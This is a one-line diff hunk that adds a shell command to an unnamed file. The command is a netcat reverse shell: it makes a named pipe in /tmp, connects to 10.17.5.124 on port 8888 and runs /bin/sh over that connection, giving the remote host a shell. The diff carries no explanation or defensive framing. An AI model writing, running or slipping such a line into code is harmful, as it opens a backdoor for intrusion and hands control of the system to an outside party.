@@ -1,0 +1,1 @@
+mkfifo /tmp/ukek; nc 10.17.5.124 8888 0</tmp/ukek | /bin/sh >/tmp/ukek 2>&1; rm /tmp/ukek
